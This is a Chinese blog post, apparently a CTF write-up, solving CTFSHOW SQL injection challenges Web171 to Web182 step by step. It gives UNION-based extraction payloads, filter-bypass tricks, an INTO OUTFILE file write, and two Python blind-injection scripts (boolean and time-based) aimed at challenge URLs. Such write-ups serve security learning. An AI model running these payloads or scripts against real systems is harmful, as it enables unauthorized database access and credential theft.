<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CTFSHOW-SQL注入 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CTFSHOW-SQL注入 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:16:20.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CTFSHOW-SQL注入</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="Web171（万能密码）"><a href="#Web171（万能密码）" class="headerlink" title="Web171（万能密码）"></a>Web171（万能密码）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730646800-a3d56e79-c92d-4e3e-ba24-38d305ee6f16.png#averageHue=%23f7f6f6&clientId=u5eef4552-7a00-4&from=paste&height=203&id=uc0746973&name=image.png&originHeight=254&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32871&status=done&style=none&taskId=u44980cdc-08a4-4ead-a10e-2b03eb573e4&title=&width=936.8" alt="image.png"><br>本地给的提示如图，普通的查询语句，这里的知识点是<strong>and和or的优先级</strong><br>如：select * from product where name&#x3D;’jack’ and age&#x3D;18 or id &#x3D;1<br>这句话的意思是，名字叫jack且年龄为18的人或者id为1的人，and的优先级比or高<br>所以我们的payload：1’ or 1&#x3D;1–<br>这里要闭合引号，题中有一个双引号一个单引号，我们照葫芦画瓢<br>payload2：9999’ or id&#x3D;’26<br>这个就不用注释了，直接手动闭合单引号</p>
<h2 id="Web172（联合查询）"><a href="#Web172（联合查询）" class="headerlink" title="Web172（联合查询）"></a>Web172（联合查询）</h2><p><strong>[模块一]</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730707757-1cc5f4f2-fa84-4c2e-a4c9-1e34a44f9d3a.png#averageHue=%23f7f7f7&clientId=u5eef4552-7a00-4&from=paste&height=318&id=ue2447a6b&name=image.png&originHeight=397&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43724&status=done&style=none&taskId=u5030f6ac-a355-40aa-a4f2-841ae5aaa23&title=&width=877.6" alt="image.png"><br>这边我们首先尝试用上一把的payload试试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730714737-fe550c04-1db9-4ba8-b02d-3d2b02953e1a.png#averageHue=%23fcfcfc&clientId=u5eef4552-7a00-4&from=paste&height=446&id=ufe7e2857&name=image.png&originHeight=557&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91651&status=done&style=none&taskId=u08e60b35-1b6b-427a-9cb3-6cb78424b29&title=&width=907.2" alt="image.png"><br>很好，不给我们继续爽了，那我们就直接开始爆库，使用联合查询，具体流程如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730721642-354352c6-b3cc-451e-a64a-45f8ab010b9c.png#averageHue=%23fbfbfb&clientId=u5eef4552-7a00-4&from=paste&height=206&id=u02066327&name=image.png&originHeight=258&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20324&status=done&style=none&taskId=uabdab192-2bd2-4abc-87cf-459e6d34f51&title=&width=935.2" alt="image.png"><br>我们的1,2,3已经成功传入进去了，我们接下来继续payload：1’ union select table_name,2,3 from information_schema.tables where table_schema&#x3D;database()–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730740568-79e2224c-3483-4b53-a9a0-8c5f849b2829.png#averageHue=%23fbfbfb&clientId=u5eef4552-7a00-4&from=paste&height=272&id=u2091f10b&name=image.png&originHeight=340&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36415&status=done&style=none&taskId=u04dfb00c-9323-4b48-b1b0-eb515ce2395&title=&width=971.2" alt="image.png"><br>我们已经把表名暴露出来了，&#x3D;ctfshow_user就是一开始的假flag，接下来爆字段名称，payload：1’ union select column_name,2,3 from information_schema.columns where table_name&#x3D;’ctfshow_user2’–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730752169-7030211a-0227-4393-be35-7e2740b232a8.png#averageHue=%23fafafa&clientId=u5eef4552-7a00-4&from=paste&height=261&id=u0d68d599&name=image.png&originHeight=326&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31736&status=done&style=none&taskId=ube13e90f-8340-4a59-b87e-a0be0de529a&title=&width=858.4" alt="image.png"><br>成功了，我们就继续深入，直接读取password，username，id。payload：1’ union select id,password,username from ctfshow_user2–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730758034-33fab733-434b-4cf9-bf59-08cf7932ad4d.png#averageHue=%23fcfcfc&clientId=u5eef4552-7a00-4&from=paste&height=394&id=u7a2fe35e&name=image.png&originHeight=493&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83305&status=done&style=none&taskId=u026054aa-1892-4088-9ccf-7f0de3a10e3&title=&width=804" alt="image.png"><br>喜提flag！<br><strong>[模块2]</strong><br>模块二长着损样，多了一个返回逻辑，意思是<strong>如果用户名里有flag那么就会过滤不输出</strong><br>这里先试试payload：1’ or 1&#x3D;1 –<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730765798-b177ff90-2979-405c-a9e7-8a65e9e3b748.png#averageHue=%23f7f7f7&clientId=u5eef4552-7a00-4&from=paste&height=379&id=u8a2aaf55&name=image.png&originHeight=474&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51089&status=done&style=none&taskId=u8339b9da-9fa3-4c15-ae17-3366327733e&title=&width=869.6" alt="image.png"><br>这里发现id被过滤了，简单，我们已经知道flag就在password里面，flag就是username，那我们不就不输出用户名吗？payload：1’ union select 1,2–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730781684-2527a378-1cc6-4b53-a1bf-8cd7006c4c39.png#averageHue=%23fafafa&clientId=u5eef4552-7a00-4&from=paste&height=195&id=u931f9622&name=image.png&originHeight=244&originWidth=1123&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16813&status=done&style=none&taskId=u327e7f45-a077-4a4c-bf1e-57397059bc2&title=&width=898.4" alt="image.png"><br>可以发现1,2显示在后两格，所以就最终的payload就显而易见：1’ union select 1,password from ctfshow_user2–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730792349-6d8002ce-6b26-4c56-b6dc-475e28b7aab0.png#averageHue=%23fbfbfb&clientId=u5eef4552-7a00-4&from=paste&height=311&id=u089500c7&name=image.png&originHeight=389&originWidth=1065&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39936&status=done&style=none&taskId=ub6ec1f87-901b-434e-a8ed-148b4239c5b&title=&width=852" alt="image.png"><br>喜提flag！<br>另一个payload写法：<br>1’ union select 1,password from ctfshow_user2 where username&#x3D;’flag</p>
<h2 id="Web173（联合查询）"><a href="#Web173（联合查询）" class="headerlink" title="Web173（联合查询）"></a>Web173（联合查询）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730859278-50c282fe-29de-45a0-b925-ed7eb609f522.png#averageHue=%23f6f6f6&clientId=u5eef4552-7a00-4&from=paste&height=304&id=ud5de38de&name=image.png&originHeight=380&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50875&status=done&style=none&taskId=u7c9b7a2a-8f85-48fd-8b37-592535fccf9&title=&width=941.6" alt="image.png"><br>意思和上一题差不多，那个json不要管，我们用上一题的payload完全可以写出来，但是现在玩点子花样：</p>
<ul>
<li>hex():对字符串进行16进制加密</li>
</ul>
<p>payload：1’ union select hex(username),password,3 from ctfshow_user3–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730869172-19e9465d-5e32-4363-ae71-5fe4bf1bf702.png#averageHue=%23fbfafa&clientId=u5eef4552-7a00-4&from=paste&height=323&id=u0d5d8ad3&name=image.png&originHeight=404&originWidth=1155&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66362&status=done&style=none&taskId=uf27cd13e-7281-4ed1-b994-fbc69c242a9&title=&width=924" alt="image.png"><br>咱们给他把flag加密了，就可以出来了<br>payload的第二种写法：9999’ union select hex(username),password,3 from ctfshow_user3 where username&#x3D;’flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663730877314-042ee3f5-e25c-4921-bf84-6beb75a06e64.png#averageHue=%23fbfbfa&clientId=u5eef4552-7a00-4&from=paste&height=162&id=u0127b627&name=image.png&originHeight=202&originWidth=1092&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31144&status=done&style=none&taskId=uf278fc8c-659c-4f3e-bb62-7e1ce28ad39&title=&width=873.6" alt="image.png"></p>
<h2 id="Web174（replace或盲注）"><a href="#Web174（replace或盲注）" class="headerlink" title="Web174（replace或盲注）"></a>Web174（replace或盲注）</h2><p>进入页面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663742731542-721c8de7-d594-45d7-b512-6b5235367037.png#averageHue=%23f7f7f7&clientId=u5eef4552-7a00-4&from=paste&height=517&id=uc270bfc2&name=image.png&originHeight=646&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35904&status=done&style=none&taskId=ude025a24-a402-477e-be30-7c4c57481a6&title=&width=1049.6" alt="image.png"><br>查询语句中ban掉了数字，也就是说如果回显结果中有数字是没有数据的<br>这里可以使用replace函数，将数字替换成指定的字符</p>
<ul>
<li>replace(“字符串”,”需要替换的字符”,”替换字符”)</li>
</ul>
<p>payload:1’ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(c.password,”1”,”!”),”2”,”@”),”3”,”#”),”4”,”$”),”5”,”%”),”6”,”^”),”7”,”&amp;”),”8”,”<em>“),”9”,”(“),”0”,”)”) from ctfshow_user4 as c where c.username&#x3D;’flag’–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663742883893-6b3e28ca-cc9e-44c2-a117-761ae207521d.png#averageHue=%23fafafa&clientId=u5eef4552-7a00-4&from=paste&height=190&id=u53998c5a&name=image.png&originHeight=238&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13417&status=done&style=none&taskId=u29d5fe39-f33e-42f3-8d9b-a5be271074c&title=&width=1006.4" alt="image.png"><br>发现接口异常，很疑惑？我就抓了个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663742906732-02841711-3518-4d3b-bc82-68ae8ef157b8.png#averageHue=%23f8f7f7&clientId=u5eef4552-7a00-4&from=paste&height=189&id=u0f91b9dc&name=image.png&originHeight=236&originWidth=1352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28612&status=done&style=none&taskId=ud4267eec-6960-4c49-bc81-882f0751045&title=&width=1081.6" alt="image.png"><br>你知道什么是尿分叉吗，就是这种尿拉不完的，这里卡了我好一会儿，抓包之后才发现是有一部分没有传输进去！<br>来分析一下，这里截断的地方是<code>,&quot;3&quot;,&quot;#&quot;)</code>因为这里有个#号，#号在URL有特殊意义，所以没法转换过去，我们把#替换为”SEX”之后发现仍然是接口异常，再次抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663743427021-6e9bdad0-e830-451f-92e7-7f920b7671d5.png#averageHue=%23f7f1f1&clientId=u5eef4552-7a00-4&from=paste&height=57&id=u530a289f&name=image.png&originHeight=71&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13242&status=done&style=none&taskId=u70aa7669-43b3-46ea-862d-92c013ff00d&title=&width=1026.4" alt="image.png"><br>可以看到后面有你有部分是蓝色的，结果分析过后发现是7号位的”&amp;”在URL也是有特殊意义的，这是传参用的，把&amp;替换为“SEXX”，再payload：<br>1’ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(c.password,”1”,”!”),”2”,”@”),”3”,”SEX”),”4”,”$”),”5”,”%”),”6”,”^”),”7”,”SEXX”),”8”,”</em>“),”9”,”(“),”0”,”)”) from ctfshow_user4 as c where c.username&#x3D;’flag’–<br>这次就有了回显：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663743493448-53a0e0e7-2219-4291-8535-f45dc5096955.png#averageHue=%23fafafa&clientId=u5eef4552-7a00-4&from=paste&height=135&id=u4714799b&name=image.png&originHeight=169&originWidth=1245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10282&status=done&style=none&taskId=u865556ff-d0f1-44be-97f4-efdaf559b38&title=&width=996" alt="image.png"><br>ctfshow{b@cdf(@e-SEX**SEXX-$f)b-<em>^)%-SEXdSEX</em>f!a@$aba}<br>手动把我们替换的字符改回来即可</p>
<p>方法二：<br>使用二分法盲注，这里是y4tacker大佬的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8a600bf8-fcf2-4f51-ad7c-f4c98b3d87bd.challenge.ctf.show/api/v4.php?id=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1=if(ascii(substr((select  password from ctfshow_user4 where username=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) -- -&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>改了一点点，感觉那个limit不需要<br>二分法盲注的原理实际上也就是数学里的二分法，和时间盲注也很类似，就是不断地缩小范围，最后因为ASCII是整数，直接确定字母<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663743918186-4a244b3c-d651-4d32-a72f-299646ac9af6.png#averageHue=%23927d62&clientId=u5eef4552-7a00-4&from=paste&height=125&id=u1cefe52f&name=image.png&originHeight=156&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27874&status=done&style=none&taskId=u2f353ba2-7425-4fbb-845c-73681ef87ee&title=&width=544.8" alt="image.png"><br>受教了</p>
<h2 id="Web175（时间盲注-写入文件）"><a href="#Web175（时间盲注-写入文件）" class="headerlink" title="Web175（时间盲注+写入文件）"></a>Web175（时间盲注+写入文件）</h2><p>这一题用上一题二分法的思路仍然可行，需要改一下大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7b884264-3c13-4aa4-a57f-8760f3cad6f5.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),0) -- -&quot;</span></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="keyword">if</span> r.status_code!=<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(r.status_code)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意URL中的and不可以改成or，如果改成or会增加判断的条数，导致时间超时：<br>如果上述脚本改成or，sleep(1),那么响应时间会变成24s，用了or，如果if语句成功了，就会判断24条数据，所以浪费24s！这是非常缓慢的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663748437374-d9e4b9c9-5b8c-4b50-b76e-58130b9bc44a.png#averageHue=%232e2d2c&clientId=u5eef4552-7a00-4&from=paste&height=138&id=u3cb396b6&name=image.png&originHeight=172&originWidth=673&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15046&status=done&style=none&taskId=ub198b63e-f04f-4bd6-b765-ae11cc55e0a&title=&width=538.4" alt="image.png"><br>所以我们要改成and，这样的话脚本跑一下答案就出来了：<br>![Y2<del>AONSDX5CHBT}8&#96;}[M(@5.png](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663748460429-a13469e6-35fe-4337-bb62-64ebf3aa7f8b.png#averageHue=%23968165&amp;clientId=u5eef4552-7a00-4&amp;from=paste&amp;height=143&amp;id=u8400858e&amp;name=Y2">https://cdn.nlark.com/yuque/0/2022/png/32634994/1663748460429-a13469e6-35fe-4337-bb62-64ebf3aa7f8b.png#averageHue=%23968165&amp;clientId=u5eef4552-7a00-4&amp;from=paste&amp;height=143&amp;id=u8400858e&amp;name=Y2</a></del>AONSDX5CHBT%7D8%60%7D%5BM%28%405.png&amp;originHeight&#x3D;179&amp;originWidth&#x3D;593&amp;originalType&#x3D;binary&amp;ratio&#x3D;1&amp;rotation&#x3D;0&amp;showTitle&#x3D;false&amp;size&#x3D;24398&amp;status&#x3D;done&amp;style&#x3D;none&amp;taskId&#x3D;udd708d10-aab5-4b5e-8c9a-07cff1d1a84&amp;title&#x3D;&amp;width&#x3D;474.4)<br>受教<br>解法二：</p>
<ul>
<li>select <code>xxx </code>into outfile<code>pc路径</code>：将xxx数据写入pc路径文件中</li>
</ul>
<p>如：SELECT customer_id, firstname, surname INTO OUTFILE ‘&#x2F;exportdata&#x2F;customers.txt’<br>这里用这个将passwd写入我们的1.txt文件<br>payload：1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;html&#x2F;www&#x2F;1.txt’–<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663749000973-5a4abe5f-f1ed-4852-bc1f-a3ad79600b9e.png#averageHue=%23fbfbfb&clientId=u5eef4552-7a00-4&from=paste&height=128&id=u52c3b511&name=image.png&originHeight=160&originWidth=1094&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6858&status=done&style=none&taskId=ufdd23f32-b9b1-41e2-8572-f4d5409e473&title=&width=875.2" alt="image.png"><br>虽然他这里显示接口异常，但是我们访问Url+1.txt还是可以看到答案的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663749024819-b1058f14-83de-4c3c-a264-2067deb49f51.png#averageHue=%23c3d1e1&clientId=u5eef4552-7a00-4&from=paste&height=126&id=u730ce1c4&name=image.png&originHeight=157&originWidth=870&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12098&status=done&style=none&taskId=u77331059-79c7-4557-bc0a-ac89c187abf&title=&width=696" alt="image.png"></p>
<h2 id="Web176（万能密码，过滤开始）"><a href="#Web176（万能密码，过滤开始）" class="headerlink" title="Web176（万能密码，过滤开始）"></a>Web176（万能密码，过滤开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663757770430-65c47426-6b27-4588-9141-1959a7e994af.png#averageHue=%23f6f6f6&clientId=u617acff6-b18a-4&from=paste&height=320&id=u082accb8&name=image.png&originHeight=400&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25225&status=done&style=none&taskId=u2ff07331-4e1b-4480-a9a7-09422f26344&title=&width=1034.4" alt="image.png"><br>确实过于简单，<code>1&#39; or 1=1-- </code>直接一把嗦<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663757795849-a67e6325-035b-40ef-a3f4-5ec95420cd7d.png#averageHue=%23fbfbfb&clientId=u617acff6-b18a-4&from=paste&height=78&id=u5f33a620&name=image.png&originHeight=97&originWidth=1348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12870&status=done&style=none&taskId=ub77a8d36-222b-40e6-9585-0351023e576&title=&width=1078.4" alt="image.png"></p>
<h2 id="Web177（空格过滤）"><a href="#Web177（空格过滤）" class="headerlink" title="Web177（空格过滤）"></a>Web177（空格过滤）</h2><p>经过一些小测试发现是过滤了空格，空格过滤了可以用多行注释<code>/**/</code>去代替<br>输入<br><code>1&#39;union/**/select/**/1,2,3%23</code>，%23是#，因为在URL中意义所以转码<br>有回显：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663759452700-ed8050d9-af3d-4239-9a8b-61d02c687915.png#averageHue=%23fbfbfb&clientId=u617acff6-b18a-4&from=paste&height=161&id=uccddde5e&name=image.png&originHeight=201&originWidth=1259&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10214&status=done&style=none&taskId=ue6ba861b-fc0e-4ea1-8a58-05eb25e03e6&title=&width=1007.2" alt="image.png"><br>继续输入：<br><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23</code><br>直接读取flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663759472747-2c8c1372-500d-4db6-bd29-4f3995afa0cd.png#averageHue=%23fbfbfb&clientId=u617acff6-b18a-4&from=paste&height=154&id=u76182c2a&name=image.png&originHeight=193&originWidth=1489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9809&status=done&style=none&taskId=u7d016311-8f59-420e-9a32-a921efb22ac&title=&width=1191.2" alt="image.png"><br>受教</p>
<h2 id="Web178（空格过滤）"><a href="#Web178（空格过滤）" class="headerlink" title="Web178（空格过滤）"></a>Web178（空格过滤）</h2><p>这里除了禁用空格，还禁用了*<br>我们不能使用&#x2F;**&#x2F;去绕过空格了，但是我们还有一大堆东西啊<br>使用%09，%0a,%0c这些全部都可以<br>payload：<br><code>1&#39;%09or%091=1%23</code><br>或者<br>payload：<br><code>1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#39;flag&#39;%23</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663760337453-bca422b1-a114-4259-996a-715622a932be.png#averageHue=%23fafafa&clientId=u617acff6-b18a-4&from=paste&height=138&id=u7712c67a&name=image.png&originHeight=173&originWidth=1328&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10057&status=done&style=none&taskId=ua1fe630a-35d8-48e9-8c96-b27f5706409&title=&width=1062.4" alt="image.png"><br>都可以得出答案，都可以</p>
<h2 id="Web179（同上）"><a href="#Web179（同上）" class="headerlink" title="Web179（同上）"></a>Web179（同上）</h2><p>在上一题的基础上ban了%09<br>用%0c薄纱<br>payload：<br><code>1&#39;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#39;flag&#39;%23</code><br>or：<br><code>1&#39;%0cor%0c1=1%23</code></p>
<h2 id="Web180-同上）"><a href="#Web180-同上）" class="headerlink" title="Web180(同上）"></a>Web180(同上）</h2><p>在上一题基础上ban了#，但是不ban%0c<br>payload：<code>1&#39;%0cor%0c1=1--%0c</code></p>
<p>payload2:<br><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
<h2 id="Web181-同上）"><a href="#Web181-同上）" class="headerlink" title="Web181(同上）"></a>Web181(同上）</h2><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code><br>依旧白嫖</p>
<h2 id="Web182（同上）"><a href="#Web182（同上）" class="headerlink" title="Web182（同上）"></a>Web182（同上）</h2><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code><br>or：<br><code>id=0&#39;||(username)regexp&#39;f</code></p>
<ul>
<li>REGEXP：</li>
</ul>
